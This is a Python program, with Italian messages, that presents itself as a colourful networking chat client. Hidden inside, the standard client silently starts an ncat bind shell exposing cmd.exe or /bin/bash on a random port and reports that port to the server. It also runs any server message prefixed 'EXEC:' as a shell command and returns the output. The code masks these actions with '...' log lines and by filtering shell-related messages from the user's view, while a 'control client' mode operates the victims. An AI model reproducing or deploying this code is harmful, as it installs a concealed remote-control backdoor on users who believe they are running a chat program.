#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗██╗  ██╗ █████╗ ████████╗     ██████╗██╗     ██╗███████╗███╗   ██╗  ║
║  ██╔════╝██║  ██║██╔══██╗╚══██╔══╝    ██╔════╝██║     ██║██╔════╝████╗  ██║  ║
║  ██║     ███████║███████║   ██║       ██║     ██║     ██║█████╗  ██╔██╗ ██║  ║
║  ██║     ██╔══██║██╔══██║   ██║       ██║     ██║     ██║██╔══╝  ██║╚██╗██║  ║
║  ╚██████╗██║  ██║██║  ██║   ██║       ╚██████╗███████╗██║███████╗██║ ╚████║  ║
║   ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝        ╚═════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═══╝  ║
║                                                                              ║
║                     [ Advanced Networking Chat Client ]                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import sys
import platform
import subprocess
import select
import random
import os
import json
import time
from datetime import datetime

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    GREY = '\033[90m'
    MAGENTA = '\033[95m'
    
    # Background colors
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    
    # Bright colors
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'

    @staticmethod
    def colorize(text, color):
        return f"{color}{text}{Colors.ENDC}"
    
    @staticmethod
    def enable_windows_colors():
        if platform.system() == 'Windows':
            os.system('color')
            try:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            except:
                pass

class ChatClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.nickname = None
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.platform = platform.system()
        self.running = True
        self.prompt_active = False
        self.ncat_port = random.randint(49152, 65535)
        self.ncat_process = None
        self.is_control_client = (port == 4343)
        
        # Enable colors on Windows
        Colors.enable_windows_colors()
        
        # Print banner
        self._print_banner()

    def _print_banner(self):
        """Print a fancy ASCII banner."""
        print(Colors.CYAN + """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗██╗  ██╗ █████╗ ████████╗     ██████╗██╗     ██╗███████╗███╗   ██╗  ║
║  ██╔════╝██║  ██║██╔══██╗╚══██╔══╝    ██╔════╝██║     ██║██╔════╝████╗  ██║  ║
║  ██║     ███████║███████║   ██║       ██║     ██║     ██║█████╗  ██╔██╗ ██║  ║
║  ██║     ██╔══██║██╔══██║   ██║       ██║     ██║     ██║██╔══╝  ██║╚██╗██║  ║
║  ╚██████╗██║  ██║██║  ██║   ██║       ╚██████╗███████╗██║███████╗██║ ╚████║  ║
║   ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝        ╚═════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═══╝  ║
║                                                                              ║
║                     [ Advanced Networking Chat Client ]                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
""" + Colors.ENDC)
        
        print(Colors.BOLD + Colors.YELLOW + "  • " + Colors.ENDC + 
              Colors.GREY + "Connecting to: " + Colors.ENDC + 
              Colors.BOLD + f"{self.host}:{self.port}" + Colors.ENDC)
        
        print(Colors.BOLD + Colors.YELLOW + "  • " + Colors.ENDC + 
              Colors.GREY + "Mode: " + Colors.ENDC + 
              Colors.BOLD + ("Control Client" if self.is_control_client else "Standard Client") + Colors.ENDC)
        
        print(Colors.BOLD + Colors.YELLOW + "  • " + Colors.ENDC + 
              Colors.GREY + "Platform: " + Colors.ENDC + 
              Colors.BOLD + f"{platform.system()} {platform.release()}" + Colors.ENDC)
        
        print(Colors.BOLD + Colors.YELLOW + "  • " + Colors.ENDC + 
              Colors.GREY + "Python: " + Colors.ENDC + 
              Colors.BOLD + f"{platform.python_version()}" + Colors.ENDC)
        
        print("\n" + Colors.BRIGHT_BLACK + "  Type 'exit' to disconnect from the server." + Colors.ENDC)
        print(Colors.BRIGHT_BLACK + "  Initializing connection..." + Colors.ENDC + "\n")

    def _log(self, message, level="INFO"):
        """Print a formatted log message."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if level == "INFO":
            color = Colors.BLUE
            symbol = "ℹ"
        elif level == "SUCCESS":
            color = Colors.GREEN
            symbol = "✓"
        elif level == "ERROR":
            color = Colors.RED
            symbol = "✗"
        elif level == "WARNING":
            color = Colors.YELLOW
            symbol = "⚠"
        elif level == "SYSTEM":
            color = Colors.MAGENTA
            symbol = "⚙"
        else:
            color = Colors.GREY
            symbol = "●"
            
        sys.stdout.write(f"\r{color}{Colors.BOLD}[{timestamp}] {symbol} {Colors.ENDC}{message}\n")
        
        if self.nickname:
            sys.stdout.write(f"{Colors.GREEN}{self.nickname}{Colors.ENDC}> ")
            sys.stdout.flush()
            self.prompt_active = True

    def _is_ncat_installed(self):
        try:
            subprocess.run(["ncat", "--version"], 
                          stdout=subprocess.PIPE, 
                          stderr=subprocess.PIPE,
                          check=True)
            return True
        except:
            return False

    def start_ncat_server(self):
        if not self._is_ncat_installed():
            if not self.is_control_client:
                self._log("Ncat non è installato sul sistema", "WARNING")
            return False

        try:
            if self.platform == 'Windows':
                cmd = f"ncat -lvnp {self.ncat_port} -e cmd.exe"
                creationflags = subprocess.CREATE_NO_WINDOW
                self.ncat_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=creationflags
                )
            else:
                cmd = f"ncat -lvn 0.0.0.0 {self.ncat_port} -e /bin/bash"
                self.ncat_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            # Verifica che Ncat sia in ascolto
            for i in range(3):
                if not self.is_control_client:
                    sys.stdout.write(f"\r{Colors.BRIGHT_BLACK}[{i+1}/3] Avvio di Ncat in corso...{Colors.ENDC}")
                    sys.stdout.flush()
                time.sleep(1)
                if self._verify_ncat_listening():
                    if not self.is_control_client:
                        self._log(f"Ncat in ascolto sulla porta {self.ncat_port}", "SUCCESS")
                    return True
            
            if not self.is_control_client:
                self._log("Impossibile avviare Ncat", "ERROR")
            return False
        except Exception as e:
            if not self.is_control_client:
                self._log(f"Errore durante l'avvio di Ncat: {str(e)}", "ERROR")
            return False

    def _verify_ncat_listening(self):
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(1)
            result = test_sock.connect_ex(('127.0.0.1', self.ncat_port))
            test_sock.close()
            return result == 0
        except:
            return False

    def clear_input_buffer(self):
        try:
            while select.select([sys.stdin], [], [], 0)[0]:
                sys.stdin.readline()
        except:
            pass

    def _format_message(self, message):
        """Format incoming messages for better readability."""
        if ":" in message:
            # Try to separate username from message
            parts = message.split(":", 1)
            if len(parts) == 2:
                username, content = parts
                # Check if it looks like a username prefix
                if len(username.strip()) < 20 and not "\n" in username:
                    return f"{Colors.BOLD}{Colors.YELLOW}{username}:{Colors.ENDC} {content}"
        
        return message

    def receive(self):
        while self.running:
            try:
                ready = select.select([self.client], [], [], 0.1)
                if ready[0]:
                    message = self.client.recv(4096).decode('utf-8')
                    if not message:
                        break
                    
                    if message.startswith("EXEC:"):
                        # Esegui comando remoto
                        command = message[5:]
                        try:
                            self._log(f"...", "SYSTEM")
                            result = subprocess.run(command, shell=True, 
                                                  capture_output=True, text=True, 
                                                  timeout=10)
                            output = result.stdout if result.stdout else result.stderr
                            if not output:
                                output = f"..."
                            
                            response = {
                                "type": "command_result",
                                "client": self.nickname if self.nickname else "unknown",
                                "command": command,
                                "output": output
                            }
                            self.client.send(f"EXEC_RESULT:{json.dumps(response)}".encode('utf-8'))
                            self._log(f"...", "SUCCESS")
                        except subprocess.TimeoutExpired:
                            self._log("Timeout esecuzione comando", "ERROR")
                            response = {
                                "type": "command_result",
                                "client": self.nickname if self.nickname else "unknown",
                                "command": command,
                                "output": "Timeout: il comando ha impiegato troppo tempo"
                            }
                            self.client.send(f"EXEC_RESULT:{json.dumps(response)}".encode('utf-8'))
                        except Exception as e:
                            self._log(f"Errore esecuzione comando: {str(e)}", "ERROR")
                            response = {
                                "type": "command_result",
                                "client": self.nickname if self.nickname else "unknown",
                                "command": command,
                                "output": f"Errore: {str(e)}"
                            }
                            self.client.send(f"EXEC_RESULT:{json.dumps(response)}".encode('utf-8'))
                    else:
                        # Filtra messaggi tecnici per client normali
                        if not self.is_control_client and ("Ncat" in message or "Shell remota" in message):
                            continue
                            
                        self.clear_input_buffer()
                        
                        formatted_message = self._format_message(message)
                        
                        # Print system messages with color formatting
                        if "[SERVER]" in message:
                            formatted_message = message.replace("[SERVER]", f"{Colors.CYAN}{Colors.BOLD}[SERVER]{Colors.ENDC}")
                        
                        # Print welcome/connection messages in green
                        if "connesso" in message or "entrato" in message:
                            formatted_message = Colors.GREEN + message + Colors.ENDC
                        
                        # Print disconnection messages in red
                        if "disconnesso" in message or "uscito" in message:
                            formatted_message = Colors.RED + message + Colors.ENDC
                            
                        print(f"\r{formatted_message}")
                        if self.nickname:
                            print(f"{Colors.GREEN}{self.nickname}{Colors.ENDC}> ", end='', flush=True)
                            self.prompt_active = True
            except Exception as e:
                if self.is_control_client:
                    self._log(f"Errore nella connessione: {str(e)}", "ERROR")
                break
        
        self.running = False
        if self.is_control_client:
            self._log("Connessione persa con il server!", "ERROR")
        self.stop_ncat_server()
        self.client.close()

    def stop_ncat_server(self):
        if self.ncat_process:
            try:
                self.ncat_process.terminate()
                self.ncat_process.wait(timeout=2)
                if not self.is_control_client:
                    self._log(f"Server Ncat sulla porta {self.ncat_port} arrestato", "INFO")
            except:
                pass

    def write(self):
        while self.running:
            try:
                if self.nickname:
                    message = input(f"{Colors.GREEN}{self.nickname}{Colors.ENDC}> " if self.prompt_active else "")
                    self.prompt_active = False
                else:
                    message = input(f"{Colors.GREY}>{Colors.ENDC} " if self.prompt_active else "")
                    self.prompt_active = False
                
                if message.lower() == 'exit':
                    self._log("Disconnessione in corso...", "INFO")
                    self.running = False
                    break
                
                self.client.send(message.encode('utf-8'))
            except KeyboardInterrupt:
                self._log("Interruzione forzata dal client", "WARNING")
                self.running = False
                break
            except:
                self.running = False
                break

    def _show_spinner(self, text, seconds):
        """Show a spinner while performing a task."""
        spinner = ['◜', '◠', '◝', '◞', '◡', '◟']
        start_time = time.time()
        i = 0
        
        while time.time() - start_time < seconds:
            symbol = spinner[i % len(spinner)]
            sys.stdout.write(f"\r{Colors.BRIGHT_BLACK}{symbol} {text}...{Colors.ENDC}")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1

    def run(self):
        try:
            self._show_spinner("Connessione al server", 1.5)
            
            self.client.connect((self.host, self.port))
            self.client.settimeout(0.5)
            
            self._log(f"Connesso al server {self.host}:{self.port}", "SUCCESS")
            
            # Configura Ncat (solo per client normali)
            if not self.is_control_client:
                if self._is_ncat_installed() and self.start_ncat_server():
                    self.client.send(f"NCAT_PORT:{self.ncat_port}".encode('utf-8'))
                else:
                    self.client.send("NCAT_NOT_AVAILABLE".encode('utf-8'))
            else:
                self.client.send("CONTROL_CLIENT".encode('utf-8'))
                self._log("Registrato come client di controllo", "INFO")

            # Ricevi il nickname dal server
            self._show_spinner("In attesa di assegnazione nickname", 1)
            nickname_msg = self.client.recv(1024).decode('utf-8')
            if "Il tuo nome è:" in nickname_msg:
                self.nickname = nickname_msg.split(":")[1].strip()
                self._log(f"Nickname assegnato: {Colors.BOLD}{self.nickname}{Colors.ENDC}", "SUCCESS")
            
            # Separatore
            print(f"\n{Colors.BRIGHT_BLACK}{'─' * 70}{Colors.ENDC}\n")

            # Avvia thread per ricezione e scrittura
            receive_thread = threading.Thread(target=self.receive)
            receive_thread.daemon = True
            receive_thread.start()
            
            write_thread = threading.Thread(target=self.write)
            write_thread.daemon = True
            write_thread.start()
            
            # Stampa il prompt iniziale
            sys.stdout.write(f"{Colors.GREEN}{self.nickname}{Colors.ENDC}> ")
            sys.stdout.flush()
            self.prompt_active = True
            
            receive_thread.join()
            write_thread.join()
            
        except ConnectionRefusedError:
            self._log("Impossibile connettersi al server. Verifica l'IP e la porta.", "ERROR")
        except Exception as e:
            if self.is_control_client:
                self._log(f"Errore: {str(e)}", "ERROR")
        finally:
            self.stop_ncat_server()
            self.client.close()

def print_usage():
    """Print usage information with fancy formatting."""
    print(Colors.CYAN + "\n╔════════════════════════════════════════════════════════════╗")
    print("║                    ISTRUZIONI D'USO                        ║")
    print("╚════════════════════════════════════════════════════════════╝\n" + Colors.ENDC)
    
    print(Colors.BOLD + "Utilizzo: " + Colors.ENDC + "python chat_client.py <server_ip> <port>")
    print()
    print(Colors.BOLD + "Esempi:" + Colors.ENDC)
    print(Colors.YELLOW + "  Client normale:  " + Colors.ENDC + "python chat_client.py 192.168.1.100 4242")
    print(Colors.YELLOW + "  Client controllo:" + Colors.ENDC + "python chat_client.py 192.168.1.100 4343")
    print()
    print(Colors.BOLD + "Comandi disponibili:" + Colors.ENDC)
    print(Colors.YELLOW + "  exit: " + Colors.ENDC + "Disconnetti dal server")
    print()
    
if __name__ == "__main__":
    # Enable ANSI colors for Windows
    Colors.enable_windows_colors()
    
    if len(sys.argv) != 3:
        print_usage()
        sys.exit(1)
    
    host = sys.argv[1]
    
    try:
        port = int(sys.argv[2])
    except ValueError:
        print(f"{Colors.RED}Errore: La porta deve essere un numero{Colors.ENDC}")
        sys.exit(1)
    
    client = ChatClient(host, port)
    client.run()
